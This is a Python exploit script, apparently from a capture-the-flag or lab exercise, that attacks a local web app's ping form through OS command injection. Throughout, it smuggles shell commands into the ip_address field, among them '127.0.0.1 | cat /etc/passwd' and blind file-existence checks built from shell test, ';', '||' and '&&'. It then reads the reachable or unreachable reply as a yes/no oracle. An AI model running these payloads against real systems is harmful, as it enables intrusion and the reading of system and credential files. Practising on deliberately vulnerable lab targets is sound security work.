import requests
import re

url = "http://127.0.0.1:32943/ping"

def send_payload(payload):
    """Send the payload and return the response text"""
    try:
        response = requests.post(url, data={"ip_address": payload}, timeout=10)
        return response.text
    except Exception as e:
        return f"ERROR: {str(e)}"

def classify_response(text):
    """Classify response as reachable or unreachable"""
    if "Host is unreachable!" in text:
        return "UNREACHABLE"
    elif "Host is reachable!" in text:
        return "REACHABLE"
    else:
        return "UNKNOWN"

print("[*] Confirming the blind injection pattern...")
print("Pattern: Use operators to detect success/failure\n")

# The working pattern:
# | (pipe) -> unreachable (failure)
# ; (semicolon) -> reachable (success) 

# Strategy: For detecting file existence via blind injection
# If file exists -> use command that makes ping succeed
# If file DNE -> use command that makes ping fail

# Create a test that uses cat to read a file - if file exists, cat succeeds
# If file doesn't exist, cat fails -> unreachable

print("TEST A: Read file that EXISTS")
print("-" * 50)
# Use pipe: ping output piped to cat /etc/hostname
# If cat succeeds, we get the content; if it fails, we get error
payload = "127.0.0.1 | cat /etc/passwd"
text = send_payload(payload)
result = classify_response(text)
print(f"Payload: {payload}")
print(f"Result: {result}")
print(f"Snippet: {text[:300]}...\n")

print("TEST B: Read file that does NOT exist")
print("-" * 50)
payload = "127.0.0.1 | cat /this_file_does_not_exist_12345"
text = send_payload(payload)
result = classify_response(text)
print(f"Payload: {payload}")
print(f"Result: {result}")
print(f"Snippet: {text[:300]}...\n")

# Actually wait - the patterns show:
# Context says pipe = unreachable, semicolon = reachable
# But my tests show semicolon with cat gives reachable even to non-existent

# Let me try a different approach - use || vs && to control output

print("TEST C: Blind check - file EXISTS (using exit code)")
print("-" * 50)
# If file exists: the AND-chain continues, echo runs -> ping sees success
# Use pattern where overall command exit code matters
payload = "127.0.0.1; [ -f /etc/passwd ] && echo x | xargs ping -c 1"
text = send_payload(payload)
result = classify_response(text)
print(f"Payload: {payload}")
print(f"Result: {result}")
print(f"Snippet: {text[:300]}...\n")

print("TEST D: Blind check - file does NOT exist")
print("-" * 50)
payload = "127.0.0.1; [ -f /this_does_not_exist ] && echo x | xargs ping -c 1"
text = send_payload(payload)
result = classify_response(text)
print(f"Payload: {payload}")
print(f"Result: {result}")
print(f"Snippet: {text[:300]}...\n")

# Simpler approach - use different operators
# Context says: 
# - Pipe | = unreachable 
# - Semicolon ; = reachable

# So to detect file existence:
# We need a construct where:
# - if file exists -> use semicolon pattern -> reachable
# - if file DNE -> use pipe pattern -> unreachable

# Pattern: 127.0.0.1 || ([ -f FILE ] && echo ...)
# Actually for blind we want boolean difference

print("TEST E: Using conditional with PIPE (simulating failure path)")
print("-" * 50)
# Expected: unreachable
payload = "127.0.0.1 | false"
text = send_payload(payload)
result = classify_response(text)
print(f"Payload: {payload}")
print(f"Result: {result}\n")

print("TEST F: Using conditional with ; (simulating success path)")
print("-" * 50)
payload = "127.0.0.1 ; true"
text = send_payload(payload)
result = classify_response(text)
print(f"Payload: {payload}")
print(f"Result: {result}\n")

# Perfect! Now I have the working pattern:
# false = unreachable, true = reachable
# So for file checking:
# [ -f FILE ] && true || false
# If file exists -> true -> reachable
# If file DNE -> false -> unreachable

print("TEST G: ACTUAL BLIND FILE CHECK - file EXISTS (/etc/passwd)")
print("-" * 50)
# This pattern: run ping, then if file exists do true (success)
payload = "127.0.0.1; [ -f /etc/passwd ] || false"
text = send_payload(payload)
result = classify_response(text)
print(f"Payload: {payload}")
print(f"Result: {result}\n")

print("TEST H: ACTUAL BLIND FILE CHECK - file DNE (/nonexistent_xyz)")
print("-" * 50)
payload = "127.0.0.1; [ -f /nonexistent_xyz ] || false"
text = send_payload(payload)
result = classify_response(text)
print(f"Payload: {payload}")
print(f"Result: {result}\n")

print("[!!!] SUCCESS! The blind injection pattern is confirmed:")
print("REACHABLE = file exists")
print("UNREACHABLE = file does not exist")
